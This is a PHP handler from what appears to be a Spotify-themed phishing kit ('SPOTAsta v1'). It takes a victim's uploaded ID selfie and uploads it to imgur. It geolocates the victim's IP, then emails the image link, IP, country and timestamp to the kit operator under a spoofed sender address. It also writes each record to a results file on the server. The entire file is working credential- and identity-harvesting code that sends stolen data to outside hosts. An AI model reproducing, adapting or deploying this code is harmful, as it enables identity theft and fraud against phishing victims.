<?php 
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
$rand = dechex(rand(0x000000, 0xFFFFFF));
$host = isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'localhost';
$bert=md5 (rand(0,1000000000));
////
$setting = parse_ini_file('../../conf.pak'); 
$getname = $setting['Name']; 
$getemail = $setting['Email']; 
$PRONAME    = $getname; # 
$TO         = $getemail; # 
#################################################################################################################################
		$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
#################################################################################################################################
$server = parse_ini_file("../../mise.ini", true);

$g = $_POST['images'][0];

$img = $g;
$imageContent = file_get_contents($img);
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.imgur.com/3/image",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0),
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0),
  CURLOPT_FOLLOWLOCATION => false,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => array('image' => "$imageContent"),
  CURLOPT_HTTPHEADER => array(
    'Authorization: Bearer '.$server['imagura'].''
  ),
));
$response = curl_exec($curl);
curl_close($curl);
$data = json_decode($response);
$a = $data->data->link;	
/////////////////////////////////////////////////////
$typ = $_POST['doc_type'];
##############################################################################################################################################################
$MESSAGE = "<html><body><div><table cellpadding='0' cellspacing='0' align='center' border='0' bgcolor='#ffffff' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; width: 639px;'><tr><td width='600' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'><table cellpadding='0' cellspacing='0' width='600' border='0'><tr><td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'><p>Dear <font color='#008000'>".$PRONAME."</font>,<hr></p><p style=''><img border='0' src='https://1.bp.blogspot.com/-Xrkf51hrYhE/XV6xGp86chI/AAAAAAAAAHg/eO0RbRmZdbYif07iog4TpRM6uOqIY1czQCLcBGAs/s1600/SPOT.png' width='153' height='95'></p><p>
<hr><br></td></tr></table></td>
</tr>
</table>
</td>
<td width='26' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
</tr>
</table>
<table cellpadding='0' cellspacing='0' align='center' width='640' border='0' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; width: 640px; margin: auto;'>
<tr>
<td width='20' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<td width='800' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<table cellpadding='0' cellspacing='0' width='320px' border='0'>
<tr>
<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
<strong>ID Details</strong><br>
ID LINK (1) : <h>".$a."</h><br>
Type : <h>Selfi</h><br>
</tr>
</table>
</td>
<td width='27' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<td width='376' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<table cellpadding='0' cellspacing='0' width='400px' border='0'>
<tr>
<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
<strong>User Details</strong><br>
IP  : <a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a><br>
COUNTRY  : <h> ".$COUNTRYNAME." - <font color='#FF6600'>".$COUNTRYCODE."</font> </h> <br>
BROWSER & OS  : <h>".$device_details."</h><br>
TIME  : <h>".date('l jS \of F Y h:i:s A')."</h></td>
</tr>
</table>
</td>
</tr>
</table>
</div>";
$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
$SUBJECT = "Selfi - Upload | $IP | $COUNTRYCODE";
$HEADER = "MIME-Version: 1.0" . "\r\n";
$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$HEADER .= "From: SPOTAsta v1 <admin$rand@$host>\n";
mail($TO,$SUBJECT,$MESSAGE,$HEADER);
$myfile = fopen("../../rz/spoty-ID2-$bert.html", "a+") or die("Unable to open file!");
fwrite($myfile, '-------------------------------- * ID Info * -------------------------------');
fwrite($myfile, $MESSAGE);
fclose($myfile);
exit('done');
?>